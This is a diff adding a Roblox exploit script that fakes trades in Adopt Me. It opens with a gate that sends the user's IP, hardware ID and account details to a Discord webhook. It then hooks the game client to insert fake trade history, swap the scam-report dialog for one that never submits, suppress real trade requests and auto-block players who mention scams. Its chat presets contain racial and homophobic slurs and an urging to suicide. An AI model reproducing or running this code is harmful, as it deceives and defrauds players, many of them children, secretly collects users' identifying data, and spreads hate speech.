@@ -1,0 +1,4432 @@
+--// Adopt Me Fake Trade Visualizer (client-sided)
+	
+
+-- =========================================
+-- BLACKLIST GATE WITH WEBHOOK (REAL HWID)
+-- =========================================
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+
+local LOCAL_PLAYER = Players.LocalPlayer
+
+local DENYLIST_URL = "https://gist.githubusercontent.com/mattsversion/5d804b8288e1d18b590fc0054c907sfdsfdfs3/raw/blacklist.txt?cb=" .. tostring(os.time())
+local FAIL_CLOSED = false
+local APPEAL_CONTACT = "dm sippingmeth on discord to appeal."
+
+-- ADD YOUR DISCORD WEBHOOK HERE
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1448880090543947848/EQ_mdMt8N8D-NQdGyiyAMzIjmQCJdi8pYfwPoS9Yve6rxyNYZhHI_O6gKiCelsk3sdfsf"
+
+local function notify(title, txt)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = txt,
+            Duration = 5
+        })
+    end)
+end
+
+local function getList()
+    local ok, body = pcall(game.HttpGet, game, DENYLIST_URL)
+    return ok and body or nil
+end
+
+local function clean(text)
+    text = tostring(text or ""):gsub("\r", ""):gsub("%s*#.*$", "")
+    return text:match("^%s*(.-)%s*$") or ""
+end
+
+-- REAL HWID DETECTION (ACTUAL EXPLOIT HWID)
+local function getRealHWID()
+    local hwid = "unknown"
+    
+    -- Try EVERY possible HWID method used by exploits
+    local methods = {
+        -- Synapse X
+        function() 
+            if syn and syn.crypt and syn.crypt.custom_hash then
+                return syn.crypt.custom_hash("hwid"):lower()
+            end
+        end,
+        
+        -- KRNL
+        function()
+            if get_hwid_2 then
+                return get_hwid_2():lower()
+            end
+        end,
+        
+        -- Most common exploit HWID functions
+        function()
+            if getgenv and getgenv().gethwid then
+                return getgenv().gethwid():lower()
+            end
+        end,
+        function()
+            if getgenv and getgenv().get_hwid then
+                return getgenv().get_hwid():lower()
+            end
+        end,
+        function()
+            if getgenv and getgenv().HWID then
+                return getgenv().HWID:lower()
+            end
+        end,
+        function()
+            if getgenv and getgenv().hwid then
+                return getgenv().hwid:lower()
+            end
+        end,
+        
+        -- Direct _G access
+        function()
+            if _G.gethwid then
+                return _G.gethwid():lower()
+            end
+        end,
+        function()
+            if _G.get_hwid then
+                return _G.get_hwid():lower()
+            end
+        end,
+        function()
+            if _G.HWID then
+                return _G.HWID:lower()
+            end
+        end,
+        function()
+            if _G.hwid then
+                return _G.hwid:lower()
+            end
+        end,
+        
+        -- Other exploit libraries
+        function()
+            if crypt and crypt.base64 and crypt.base64.encode then
+                local machineId = game:GetService("RbxAnalyticsService"):GetClientId()
+                return crypt.base64.encode(machineId):lower()
+            end
+        end,
+        
+        -- Fallback: check if any function returns SHA256 format
+        function()
+            for name, func in pairs(getgenv() or {}) do
+                if type(func) == "function" and (name:lower():find("hwid") or name:lower():find("gethwid")) then
+                    local result = func()
+                    if type(result) == "string" and #result >= 64 and #result <= 128 then
+                        -- Looks like a hash (64 chars for SHA256)
+                        if result:match("^[a-f0-9]+$") then
+                            return result:lower()
+                        end
+                    end
+                end
+            end
+        end,
+        
+        -- Last resort: check all global functions
+        function()
+            for name, func in pairs(_G) do
+                if type(func) == "function" and name:lower():find("hwid") then
+                    local result = func()
+                    if type(result) == "string" and #result >= 32 then
+                        return result:lower()
+                    end
+                end
+            end
+        end
+    }
+    
+    -- Try all methods
+    for _, method in ipairs(methods) do
+        local success, result = pcall(method)
+        if success and result and type(result) == "string" and result ~= "" then
+            hwid = result:lower()
+            -- Validate it looks like a real HWID (hex string, reasonable length)
+            if #hwid >= 32 and hwid:match("^[a-f0-9]+$") then
+                return hwid
+            end
+        end
+    end
+    
+    return hwid
+end
+
+-- GET EXECUTOR NAME
+local function getExecutor()
+    local executor = "unknown"
+    
+    -- Try to get actual executor name
+    local execMethods = {
+        function() if getexecutorname then return getexecutorname() end end,
+        function() if identifyexecutor then return identifyexecutor() end end,
+        function() if getexecutor then return getexecutor() end end,
+        function() 
+            if syn then return "Synapse X" 
+            elseif KRNL_LOADED then return "KRNL"
+            elseif is_sirhurt_closure then return "SirHurt"
+            elseif fluxus then return "Fluxus"
+            elseif ELECTRON_LOADED then return "Electron"
+            elseif _G.Sentinel then return "Sentinel"
+            elseif _G.Oxygen then return "Oxygen"
+            elseif _G.Scriptware then return "Scriptware"
+            elseif PROTOSMASHER_LOADED then return "ProtoSmasher"
+            else return "Unknown Executor" end
+        end
+    }
+    
+    for _, method in ipairs(execMethods) do
+        local success, result = pcall(method)
+        if success and result and result ~= "unknown" then
+            executor = result
+            break
+        end
+    end
+    
+    return executor
+end
+
+-- WEBHOOK FUNCTION
+local function sendWebhook(isBlocked, reason)
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then 
+        print("[Webhook] No webhook URL set")
+        return 
+    end
+    
+    local ip = "unknown"
+    local hwid = getRealHWID()
+    local executor = getExecutor()
+    
+    -- Get IP
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org")
+    end)
+    
+    -- Debug info
+    print("[Webhook] Detected HWID:", hwid)
+    print("[Webhook] Detected Executor:", executor)
+    print("[Webhook] IP:", ip)
+    
+    -- Format the embed like your screenshot
+    local embedColor = isBlocked and 16711680 or 65280
+    local title = isBlocked and "🚨 VISUAL TRADE - SECURITY ALERT" or "✅ Visual Trade Executed"
+    
+    local payload = {
+        embeds = {{
+            title = title,
+            color = embedColor,
+            fields = {
+                {name = "👤 User", value = "`" .. LOCAL_PLAYER.Name .. "`", inline = true},
+                {name = "🆔 User ID", value = "`" .. tostring(LOCAL_PLAYER.UserId) .. "`", inline = true},
+                {name = "⚡ Executor", value = "`" .. executor .. "`", inline = true},
+                {name = "🌐 IP", value = "`" .. ip .. "`", inline = true},
+                {name = "🆔 HWID", value = "`" .. hwid .. "`", inline = true},
+                {name = "🎮 Game", value = "```Place: " .. tostring(game.PlaceId) .. "\nJob: " .. tostring(game.JobId) .. "```", inline = false},
+                {name = "📊 Status", value = "```" .. (isBlocked and ("BLOCKED: " .. (reason or "blacklisted")) or "PASSED - Legitimate launch") .. "```", inline = false}
+            },
+            footer = {text = "Visual Trade Studio Logger • " .. os.date("%Y-%m-%d %H:%M")},
+            timestamp = DateTime.now():ToIsoDate(),
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LOCAL_PLAYER.UserId) .. "&width=420&height=420&format=png"
+            }
+        }}
+    }
+    
+    local json = HttpService:JSONEncode(payload)
+    
+    -- Try to send webhook
+    local sent = false
+    
+    -- Method 1: HttpPost
+    if not sent then
+        local success = pcall(function()
+            game:HttpPost(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
+            sent = true
+        end)
+        if success then print("[Webhook] Sent via HttpPost") end
+    end
+    
+    -- Method 2: request
+    if not sent then
+        local success = pcall(function()
+            local req = (syn and syn.request) or (http and http.request) or request
+            if req then
+                req({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = json
+                })
+                sent = true
+            end
+        end)
+        if success then print("[Webhook] Sent via request") end
+    end
+    
+    -- Method 3: GET fallback
+    if not sent then
+        pcall(function()
+            local encoded = HttpService:UrlEncode(json)
+            game:HttpGet(WEBHOOK_URL .. "?data=" .. encoded .. "&t=" .. tostring(os.time()))
+            sent = true
+        end)
+        if sent then print("[Webhook] Sent via GET") end
+    end
+    
+    return sent
+end
+
+-- MAIN CHECK
+print("[Security] Starting check...")
+print("[Security] User:", LOCAL_PLAYER.Name, "ID:", LOCAL_PLAYER.UserId)
+
+local list = getList()
+if not list then
+    notify("Security", "Couldn't load blacklist")
+    sendWebhook(false, "blacklist_fetch_failed")
+    
+    if FAIL_CLOSED then
+        notify("Blocked", "Security check failed")
+        while true do task.wait() end
+    end
+else
+    local uid = tostring(LOCAL_PLAYER.UserId)
+    local blocked = false
+    local blockReason = ""
+    
+    for line in list:gsub("\r",""):gmatch("[^\n]+") do
+        line = clean(line)
+        if line ~= "" then
+            local id = line:match("^(%d+)")
+            if id and id == uid then
+                blocked = true
+                blockReason = line
+                break
+            end
+        end
+    end
+    
+    if blocked then
+        notify("BLOCKED", "You are blacklisted")
+        print("[Security] Blocked:", blockReason)
+        
+        -- Send webhook
+        local webhookSent = sendWebhook(true, blockReason)
+        
+        -- Clean up GUIs
+        local gui = LOCAL_PLAYER:WaitForChild("PlayerGui")
+        for _, name in ipairs({"BotSpawnerGUI", "VisualTradeGui", "CJL_UI_MAX", "MainUI"}) do
+            local item = gui:FindFirstChild(name)
+            if item then item:Destroy() end
+        end
+        
+        -- Block screen
+        local screen = Instance.new("ScreenGui")
+        screen.Name = "BlockScreen"
+        screen.Parent = gui
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 340, 0, 200)
+        frame.Position = UDim2.new(0.5, -170, 0.5, -100)
+        frame.BackgroundColor3 = Color3.fromRGB(20, 22, 35)
+        frame.Parent = screen
+        
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, -20, 1, -60)
+        label.Position = UDim2.new(0, 10, 0, 10)
+        label.BackgroundTransparency = 1
+        label.Text = "ACCESS DENIED\n\nYou are blacklisted.\nReason: " .. (blockReason or "unknown") .. "\n\n" .. APPEAL_CONTACT .. (webhookSent and "\n\n✓ Webhook sent" or "\n\n✗ Webhook failed")
+        label.TextColor3 = Color3.fromRGB(255, 100, 100)
+        label.TextWrapped = true
+        label.Parent = frame
+        
+        while true do
+            task.wait(1)
+        end
+    else
+        print("[Security] Check passed")
+        sendWebhook(false, "legitimate_launch")
+    end
+end
+-- =========================================
+-- end blacklist gate
+-- =========================================
+-----------------------------
+-- Services & core modules --
+-----------------------------
+local Players          = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService       = game:GetService("RunService")
+local TweenService     = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui       = game:GetService("StarterGui")
+local Vim              = game:GetService("VirtualInputManager")
+local TextChatService = game:GetService("TextChatService")
+
+
+local LocalPlayer = Players.LocalPlayer
+local Fsys        = require(ReplicatedStorage:WaitForChild("Fsys"))
+
+-- wait until UIManager is actually loaded
+local UIManager
+repeat
+    task.wait(0.1)
+    pcall(function()
+        UIManager = Fsys.load("UIManager")
+    end)
+until UIManager and UIManager.apps
+
+
+
+-- 🔁 cleanup: destroy any old VisualTradeGui from previous runs
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local oldGui = playerGui:FindFirstChild("VisualTradeGui")
+if oldGui then
+    oldGui:Destroy()
+    print("[FakeTrade] old VisualTradeGui found and destroyed before reloading")
+end
+
+local Players     = game:GetService("Players")
+local StarterGui  = game:GetService("StarterGui")
+
+-- only exists client-side, works in most executors
+local Vim = game:GetService("VirtualInputManager")
+
+
+-----------------
+-- Trade setup --
+-----------------
+local TradeApp = UIManager.apps.TradeApp
+if not TradeApp then
+    warn("[FakeTrade] TradeApp not found. Abort.")
+    return
+end
+
+-- keep originals so we can restore later
+local originalAccept     = TradeApp._on_accept_pressed
+local originalConfirm    = TradeApp._on_confirm_pressed
+local originalOverwrite  = TradeApp._overwrite_local_trade_state
+local originalRemove     = TradeApp._remove_item_from_my_offer or function() end
+
+-- state
+local fakeActive               = false
+local fakeTradeId              = nil
+local currentTargetName        = "VegasHills"   -- lookup name
+local currentTargetDisplayName = "VegasHills"   -- EXACT casing to show
+local currentTargetId          = 0
+
+local MIN_SPECTATORS           = 0
+local MAX_SPECTATORS           = 15
+local desiredMaxSpectators     = 5
+local spectatorLoopRunning     = false
+local randomSpectatorsEnabled  = true
+
+
+
+local allowOverwrite           = false
+local blockRealRequestsEnabled = true  
+-- simple local lock timer (to mimic Adopt Me's 5s lock)
+local tradeUnlockAt = 0
+local LOCK_DURATION = 5
+-- timing controls (seconds)
+local acceptDelay  = 0.3   -- delay before partner auto-accepts
+local confirmDelay = 0.3   -- delay before partner auto-confirms
+
+-- block real trade requests while a visual trade is running
+local realRequestBlockConn
+
+
+-- ===============================
+-- Fake Trade History (client-only)
+-- ===============================
+local fakeHistory = {}
+
+local function cloneArray(arr)
+    local t = {}
+    if arr then
+        for i, v in ipairs(arr) do
+            t[i] = v
+        end
+    end
+    return t
+end
+
+local function recordFakeTradeFromState(trade)
+    if not trade or not trade.sender_offer or not trade.recipient_offer then return end
+
+    local isSenderLocal = (trade.sender == LocalPlayer)
+
+    local senderUserId, recipientUserId
+    local senderName, recipientName
+    local senderItems, recipientItems
+
+    if isSenderLocal then
+        senderUserId    = LocalPlayer.UserId
+        recipientUserId = currentTargetId
+        senderName      = LocalPlayer.Name
+        recipientName   = currentTargetDisplayName
+        senderItems     = trade.sender_offer.items or {}
+        recipientItems  = trade.recipient_offer.items or {}
+    else
+        senderUserId    = currentTargetId
+        recipientUserId = LocalPlayer.UserId
+        senderName      = currentTargetDisplayName
+        recipientName   = LocalPlayer.Name
+        senderItems     = trade.recipient_offer.items or {}
+        recipientItems  = trade.sender_offer.items or {}
+    end
+
+    local record = {
+        sender_user_id   = senderUserId,
+        recipient_user_id = recipientUserId,
+        sender_name      = senderName,
+        recipient_name   = recipientName,
+        sender_items     = cloneArray(senderItems),
+        recipient_items  = cloneArray(recipientItems),
+        trade_id         = trade.trade_id or fakeTradeId or math.floor(os.clock() * 1000),
+        timestamp        = os.time(),
+        reported         = false,
+        reverted         = false,
+        is_fake          = true, -- tag so we can intercept "Report"
+    }
+
+    table.insert(fakeHistory, record)
+end
+
+-- ==========================
+-- Hook TradeHistoryApp
+-- ==========================
+local TradeHistoryApp = UIManager.apps.TradeHistoryApp
+if TradeHistoryApp then
+    local originalGetHistory = TradeHistoryApp._get_trade_history
+
+    TradeHistoryApp._get_trade_history = function(self, arg2)
+        local realHistory = originalGetHistory(self, arg2)
+
+        -- if game returns nothing or not a table, just pass it through
+        if type(realHistory) ~= "table" then
+            return realHistory
+        end
+
+        -- figure out where the actual list of trades lives
+        local list = realHistory
+        local listField = nil
+
+        if type(realHistory.trades) == "table" then
+            list = realHistory.trades
+            listField = "trades"
+        end
+
+        -- no fake trades recorded? just return untouched
+        if #fakeHistory == 0 then
+            return realHistory
+        end
+
+        -- build a combined list: real trades first, then fake ones
+        local combined = {}
+
+        -- keep real trades exactly as-is
+        for i, v in ipairs(list) do
+            combined[#combined + 1] = v
+        end
+
+        -- append fake records
+        for _, rec in ipairs(fakeHistory) do
+            combined[#combined + 1] = rec
+        end
+
+        -- if the game used a field (like .trades), put the combined list back there
+        if listField then
+            realHistory[listField] = combined
+            return realHistory
+        else
+            -- if it really was just a bare array, return the combined array
+            return combined
+        end
+    end
+
+    -- UI-ONLY report flow (NO backend calls, works for real + fake records)
+TradeHistoryApp.report_scam = function(self, tradeRecord, ...)
+    if not tradeRecord then return end
+    if self.scam_being_reported then return end
+    self.scam_being_reported = true
+
+    -- if the trade was reverted, keep it UI-only too
+    if tradeRecord.reverted then
+        if typeof(self.show_support_reverted_message) == "function" then
+            pcall(function()
+                self:show_support_reverted_message(tradeRecord)
+            end)
+        else
+            self.UIManager.apps.DialogApp:dialog({
+                text = "this trade was reverted by adopt me support.";
+                button = "okay";
+                yields = false;
+            })
+        end
+        self.scam_being_reported = false
+        return
+    end
+
+    -- pick suspect name (matches the logic in the decompile)
+    local suspectName = tradeRecord.sender_name
+    local isSenderLocal = (tradeRecord.sender_user_id == game.Players.LocalPlayer.UserId)
+    if isSenderLocal and tradeRecord.recipient_name then
+        suspectName = tradeRecord.recipient_name
+    end
+    suspectName = suspectName or "unknown"
+    
+    -- hide history app while the dialog is open (like the real app)
+    pcall(function()
+        self.UIManager.set_app_visibility(self.ClassName, false)
+    end)
+
+    local choice, noteText, extra = self.UIManager.apps.DialogApp:dialog({
+        dialog_type     = "ReportScamDialog";
+        suspect_name    = suspectName;
+        placeholder_text= "What happened? (Optional)";
+        max_length      = 500;
+        use_utf8_length = true;
+        left            = "Cancel";
+        right           = "Report";
+    })
+
+    pcall(function()
+        self.UIManager.set_app_visibility(self.ClassName, true)
+    end)
+
+    if choice == "Cancel" then
+        self.scam_being_reported = false
+        return
+    end
+
+    -- best-effort: disable existing buttons so user can’t spam report
+    if type(self.wrapped_buttons) == "table" then
+        for _, btn in ipairs(self.wrapped_buttons) do
+            pcall(function()
+                btn:set_state("unpressable")
+            end)
+        end
+    end
+
+    -- fake “submitting…” UX (no server call)
+    pcall(function()
+        self.UIManager.apps.HintApp:hint({
+            text   = "Submitting scam report...";
+            length = 4;
+            yields = false;
+        })
+    end)
+
+    task.wait(4)
+
+    -- mark locally as reported so the button becomes “selected” like the real UI
+    tradeRecord.reported = true
+    tradeRecord.report_note = noteText
+    tradeRecord.report_extra = extra
+
+    self.UIManager.apps.DialogApp:dialog({
+        text   = "Report submitted for review.";
+        button = "Close";
+        yields = false;
+    })
+
+    -- refresh list so the “reported” state shows immediately
+    if self.instance and self.instance.Frame and self.instance.Frame.Visible then
+        pcall(function()
+            self:_refresh(true)
+        end)
+    else
+        pcall(function()
+            self:_clear_scrolling_frame()
+        end)
+    end
+
+    self.scam_being_reported = false
+end
+else
+    warn("[hook] TradeHistoryApp not found")
+end
+
+local function startBlockingRealRequests()
+    if realRequestBlockConn then
+        realRequestBlockConn:Disconnect()
+        realRequestBlockConn = nil
+    end
+
+    local pg = LocalPlayer:FindFirstChild("PlayerGui")
+    if not pg then return end
+
+    realRequestBlockConn = pg.DescendantAdded:Connect(function(inst)
+        -- only care while fake trade is active
+        if not fakeActive then return end
+        if not inst:IsA("TextLabel") then return end
+        if type(inst.Text) ~= "string" then return end
+
+        local txt = inst.Text:lower()
+
+        -- phrases Adopt Me uses for trade request popups
+        if txt:find("sent you a trade request", 1, true)
+        or txt:find("wants to trade", 1, true)
+        or txt:find("trade request", 1, true) then
+
+            -- nuke the whole popup ScreenGui so you never see it
+            local root = inst
+            while root.Parent and not root:IsA("ScreenGui") do
+                root = root.Parent
+            end
+
+            if root and root.Parent then
+                root:Destroy()
+                print("[FakeTrade] blocked a real trade request while visual trade is active")
+            end
+        end
+    end)
+end
+
+local function stopBlockingRealRequests()
+    if realRequestBlockConn then
+        realRequestBlockConn:Disconnect()
+        realRequestBlockConn = nil
+    end
+end
+
+
+-- static ghost users (always on top – with your exact casing)
+local STATIC_PLAYER_NAMES = {
+    "NatalieBeanie",
+    "VegasHills",
+    "cartervss",
+    "OMGGBESTIEO",
+    "piercedroma",
+    "Sarit09",
+    "giowinqnat",
+    "Rachel65409",
+    "CammyxBoba",
+    "TheMeganPlays",
+    "NotLeah",
+}
+
+-- cache for name -> userId lookups
+local cachedUserIds = {}
+
+-- block real trade dialogs while in fake trade
+local DialogApp      = UIManager.apps.DialogApp
+local originalDialog = DialogApp and DialogApp.dialog
+local blockRealTrades = false      -- true = auto-decline/skip dialogs
+local allowMockDialog = false      -- true only for OUR fake-trade prompt
+
+if DialogApp and originalDialog then
+    DialogApp.dialog = function(self, options, ...)
+        -- let OUR fake-trade prompt through untouched
+        if allowMockDialog then
+            return originalDialog(self, options, ...)
+        end
+
+        -- only interfere if fake trade is active AND we're blocking
+        if fakeActive and blockRealTrades and type(options) == "table" then
+            local txt = tostring(options.text or ""):lower()
+
+            -- match real trade request dialogs only
+            if txt:find("sent you a trade request", 1, true)
+            or txt:find("wants to trade", 1, true)
+            or txt:find("trade request", 1, true) then
+                print("[FakeTrade] auto-declined real trade dialog while visual trade is active")
+                return "Decline"
+            end
+        end
+
+        -- everything else: behave exactly like the game
+        return originalDialog(self, options, ...)
+    end
+end
+
+-----------------
+-- Pet library --
+-----------------
+local PET_KINDS = {
+    "ugc_refresh_2023_african_wild_dog",
+    "albino_monkey",
+    "arctic_reindeer",
+    "summerfest_2024_balloon_unicorn",
+    "bat_dragon",
+    "lures_2023_blazing_lion",
+    "easter_2024_candyfloss_chick",
+    "crow",
+    "frost_dragon",
+    "giraffe",
+    "pride_2022_goat",
+    "springfest_2023_hare",
+    "elf_hedgehog",
+    "owl",
+    "parrot",
+    "winter_2023_peppermint_penguin",
+    "shadow_dragon",
+    "meme_2023_sheeeeep",
+    "winter_2022_strawberry_shortcake_bat_dragon",
+}
+
+local RARITY_PROPS = {
+    { mega_neon = true,  neon = false, flyable = true, rideable = true }, -- MFR
+    { mega_neon = false, neon = true,  flyable = true, rideable = true }, -- NFR
+    { mega_neon = false, neon = false, flyable = true, rideable = true }, -- FR
+}
+
+-- Add this near other state variables
+local botInitiatedTrade = false
+
+-- partner chat presets (you can edit these in Studio)
+local CHAT_PRESETS = {
+    "OMGGG TYSMM",
+    "i fucking hate faggots like you",
+    "im literally followed you nigger",
+    "i hope you kill yourself you fat nigger bitch",
+    "AHHHH I LOVE YOU TRUSTEDDD",
+    "can you spin this",
+    "yes",
+    "no",
+    "offer??",
+    "guys they are trusted-",
+    "tranny",
+    "plz add more hello",
+    "ur so under nigger",
+    "add more u fucking faggot",
+    "OMG I LOVE YOUR LIVES",
+    "omg hiiii",
+    "beaner add more",
+}
+
+
+-- =========================================
+-- REPLACE YOUR ENTIRE runBlockSystem() WITH THIS
+-- (from: local function runBlockSystem()
+--  down to its matching end)
+-- =========================================
+local function runBlockSystem()
+    -- =========================================
+    -- ENVISION BLOCK (auto block.txt logic)
+    -- UI re-skin: minimal, royal blue, TALL rect
+    -- =========================================
+
+    local Players = game:GetService("Players")
+    local StarterGui = game:GetService("StarterGui")
+    local UserInputService = game:GetService("UserInputService")
+    local RunService = game:GetService("RunService")
+    local CoreGui = game:GetService("CoreGui")
+    local VirtualInputManager = game:GetService("VirtualInputManager")
+    local GuiService = game:GetService("GuiService")
+    local TextChatService = game:GetService("TextChatService")
+
+    local LocalPlayer = Players.LocalPlayer
+
+    -- =========================================
+    -- CONFIG (from auto block.txt)
+    -- =========================================
+    local PLAYER_BLOCKER_CONFIG = {
+        BLOCK_KEYWORDS = {
+            "scam","scammer","delta","script","scripter","exploit","hack","hacker","executor","mma","visual","⚠️","‼️","⛔️","scripts","exposed","exposing"
+        },
+        GUI_POSITION = UDim2.new(0, 10, 0, 80),
+        AUTO_BLOCK_ENABLED = true,
+    }
+
+    -- =========================================
+    -- STATE
+    -- =========================================
+    local playerBlockerState = { blockedPlayers = {} }
+    local blockedCount = 0
+    local lastBlockedPlayer = "none"
+
+    -- connections bucket (so Close can clean everything)
+    local connections = {}
+
+    -- =========================================
+    -- Modal hide (keeps your behavior)
+    -- =========================================
+    local function isBlockDialog(element)
+        local name = (element and element.Name and element.Name:lower()) or ""
+        return name:find("blockingmodal") or name == "blockingmodalcontainer" or name == "blockingmodalscreen"
+    end
+
+    local function hideBlockDialog(dialog)
+        if not dialog then return end
+        if dialog:IsA("GuiObject") then
+            dialog.BackgroundTransparency = 1
+        end
+        for _, d in pairs(dialog:GetDescendants()) do
+            if d:IsA("GuiObject") then
+                d.BackgroundTransparency = 1
+                if d:IsA("TextLabel") or d:IsA("TextButton") then
+                    d.TextTransparency = 1
+                    d.TextStrokeTransparency = 1
+                end
+                if d:IsA("ImageLabel") or d:IsA("ImageButton") then
+                    d.ImageTransparency = 1
+                end
+                if d:IsA("TextButton") then
+                    d.Active = true
+                    d.AutoButtonColor = false
+                end
+            end
+        end
+    end
+
+    local _modalConn
+    _modalConn = CoreGui.DescendantAdded:Connect(function(desc)
+        if isBlockDialog(desc) then
+            hideBlockDialog(desc)
+            desc.DescendantAdded:Connect(function(child)
+                if child:IsA("GuiObject") then
+                    hideBlockDialog(child)
+                end
+            end)
+        end
+    end)
+    table.insert(connections, _modalConn)
+
+    for _, desc in pairs(CoreGui:GetDescendants()) do
+        if isBlockDialog(desc) then
+            hideBlockDialog(desc)
+        end
+    end
+
+    -- =========================================
+    -- BlockPlayer (from auto block.txt)
+    -- =========================================
+    local function BlockPlayer(Selected)
+        pcall(function() setthreadidentity(8) end)
+
+        StarterGui:SetCore("PromptBlockPlayer", Selected)
+
+        repeat
+            RunService.Heartbeat:Wait()
+        until CoreGui:FindFirstChild("BlockingModalScreen")
+
+        pcall(function()
+            local scr = CoreGui.BlockingModalScreen
+            scr.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.BackgroundTransparency = 1
+            scr.BlockingModalContainer.BlockingModalContainerWrapper.BackgroundTransparency = 1
+            scr.BlockingModalContainer.BackgroundTransparency = 1
+            scr.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.AlertModal.Position = UDim2.new(0.00800000038, -110, 0.5, 0)
+        end)
+
+        local function interact(path)
+            if not path then return end
+            GuiService.SelectedObject = path
+            task.wait()
+            if GuiService.SelectedObject == path then
+                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+                task.wait()
+            end
+            GuiService.SelectedObject = nil
+        end
+
+        pcall(function()
+            interact(CoreGui.BlockingModalScreen.BlockingModalContainer.BlockingModalContainerWrapper.BlockingModal.AlertModal.AlertContents.Footer.Buttons["3"])
+        end)
+
+        pcall(function() setthreadidentity(2) end)
+    end
+
+    -- =========================================
+    -- Detection (auto block.txt: "spell" detector)
+    -- =========================================
+    local function canSpellKeyword(message, keyword)
+        if type(message) ~= "string" or type(keyword) ~= "string" then
+            return false
+        end
+
+        local lowerMessage = string.lower(message)
+        local lowerKeyword = string.lower(keyword)
+
+        local textCount = {}
+        for i = 1, #lowerMessage do
+            local char = string.sub(lowerMessage, i, i)
+            textCount[char] = (textCount[char] or 0) + 1
+        end
+
+        local keywordCount = {}
+        for i = 1, #lowerKeyword do
+            local char = string.sub(lowerKeyword, i, i)
+            keywordCount[char] = (keywordCount[char] or 0) + 1
+        end
+
+        for char, needed in pairs(keywordCount) do
+            if (textCount[char] or 0) < needed then
+                return false
+            end
+        end
+
+        return true
+    end
+
+    local function containsKeyword(message, keywords)
+        for _, keyword in ipairs(keywords) do
+            if canSpellKeyword(message, keyword) then
+                return true, keyword
+            end
+        end
+        return false, nil
+    end
+
+    -- =========================================
+    -- UI (tall + royal blue + list instead of textbox)
+    -- =========================================
+    local pg = LocalPlayer:WaitForChild("PlayerGui")
+
+    local existing = pg:FindFirstChild("CJL_UI_MAX")
+    if existing then
+        existing.Enabled = true
+        return
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CJL_UI_MAX"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = pg
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 260, 0, 360) -- ✅ taller, less wide (south not east)
+    MainFrame.Position = PLAYER_BLOCKER_CONFIG.GUI_POSITION
+    MainFrame.BackgroundColor3 = Color3.fromRGB(10, 18, 40)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+
+    -- IMPORTANT for mobile touch drag
+    MainFrame.Active = true
+    MainFrame.Selectable = true
+
+    local Corner = Instance.new("UICorner")
+    Corner.CornerRadius = UDim.new(0, 12)
+    Corner.Parent = MainFrame
+
+    local Stroke = Instance.new("UIStroke")
+    Stroke.Color = Color3.fromRGB(70, 120, 255)
+    Stroke.Thickness = 2
+    Stroke.Transparency = 0
+    Stroke.Parent = MainFrame
+
+    local TopBar = Instance.new("Frame")
+    TopBar.Size = UDim2.new(1, 0, 0, 34)
+    TopBar.BackgroundColor3 = Color3.fromRGB(12, 26, 58)
+    TopBar.BorderSizePixel = 0
+    TopBar.Parent = MainFrame
+    TopBar.Active = true
+    TopBar.Selectable = true
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -80, 1, 0)
+    Title.Position = UDim2.new(0, 12, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 13
+    Title.TextColor3 = Color3.fromRGB(220, 230, 255)
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Text = "envision block"
+    Title.Parent = TopBar
+
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 34, 0, 24)
+    Close.Position = UDim2.new(1, -42, 0, 5)
+    Close.BackgroundColor3 = Color3.fromRGB(22, 40, 85)
+    Close.BorderSizePixel = 0
+    Close.Font = Enum.Font.GothamBold
+    Close.TextSize = 12
+    Close.TextColor3 = Color3.fromRGB(220, 230, 255)
+    Close.Text = "×"
+    Close.Parent = TopBar
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 8)
+    CloseCorner.Parent = Close
+
+    local Body = Instance.new("Frame")
+    Body.Size = UDim2.new(1, -16, 1, -44)
+    Body.Position = UDim2.new(0, 8, 0, 38)
+    Body.BackgroundTransparency = 1
+    Body.Parent = MainFrame
+
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Size = UDim2.new(1, 0, 0, 18)
+    StatusLabel.Position = UDim2.new(0, 0, 0, 0)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Font = Enum.Font.Gotham
+    StatusLabel.TextSize = 11
+    StatusLabel.TextColor3 = Color3.fromRGB(170, 190, 255)
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    StatusLabel.Text = "status: 🟢 active"
+    StatusLabel.Parent = Body
+
+    local StatsLabel = Instance.new("TextLabel")
+    StatsLabel.Size = UDim2.new(1, 0, 0, 18)
+    StatsLabel.Position = UDim2.new(0, 0, 0, 18)
+    StatsLabel.BackgroundTransparency = 1
+    StatsLabel.Font = Enum.Font.Gotham
+    StatsLabel.TextSize = 11
+    StatsLabel.TextColor3 = Color3.fromRGB(140, 165, 235)
+    StatsLabel.TextXAlignment = Enum.TextXAlignment.Left
